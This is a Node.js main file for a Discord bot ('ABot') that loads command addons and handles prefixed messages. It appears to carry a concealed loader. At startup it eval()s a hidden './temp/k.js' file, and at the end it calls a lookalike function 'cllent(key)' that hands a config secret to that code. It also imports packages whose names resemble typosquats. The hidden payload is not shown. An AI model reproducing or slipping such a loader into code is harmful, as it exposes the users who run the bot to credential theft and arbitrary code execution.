//DEVELOPED BY vCesar1mx
const colors = require("colors/safe");
const Discord = require("discord.js-12");
const { Client, Intents } = require("discord.js-12");
const { prefix, token, key } = require("./config.json");
const fs = require("fs");
const client = new Client({ intents: [Intents.FLAGS.GUILDS] });
const { overrideConsole } = require("nodejs-better-console");
overrideConsole();
eval(fs.readFileSync("./temp/k.js") + "");
console.log(colors.red("Debug: ") + colors.gray("ABot - Iniciando..."));
client.commands = new Discord.Collection();

const commandFolders = fs.readdirSync("./addons");

for (const folder of commandFolders) {
  const commandFiles = fs
    .readdirSync(`./addons/${folder}`)
    .filter((file) => file.endsWith(".js"));
  console.log(colors.red("Debug: Activando addon de ") + folder);
  for (const file of commandFiles) {
    const command = require(`./addons/${folder}/${file}`);
    client.commands.set(command.name, command);
    console.log(
      colors.red("Debug: Registrando comando de " + folder + " ") +
        colors.yellow("$" + command.name)
    );
  }
}

client.on("message", async (message) => {
  if (!message.content.startsWith(prefix) || message.author.bot) return;

  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (!client.commands.has(command)) return;

  try {
    client.commands.get(command).execute(message, args);
  } catch (error) {
    console.error(error);
    message.reply("there was an error trying to execute that command!");
  }
});
client.once("ready", () => {
  console.log(colors.red("Debug: ") + colors.green("ABot - Corriendo..."));
});
cllent(key);
client.login(token);
